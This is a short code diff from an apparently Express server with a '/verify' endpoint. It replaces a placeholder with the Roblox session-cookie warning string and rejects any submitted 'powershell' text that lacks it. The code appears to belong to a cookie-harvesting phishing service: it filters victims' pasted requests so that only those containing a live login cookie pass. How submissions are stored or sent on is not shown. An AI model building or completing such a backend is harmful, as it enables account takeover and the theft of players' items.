@@ -90,7 +90,7 @@ app.post(["/", "/verify"], async (req, res) => {
         return res.json({ success: false });
     }
 
-    const warning = "111";
+    const warning = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
 
     if (!powershell.includes(warning)) {
         return res.json({ success: false });
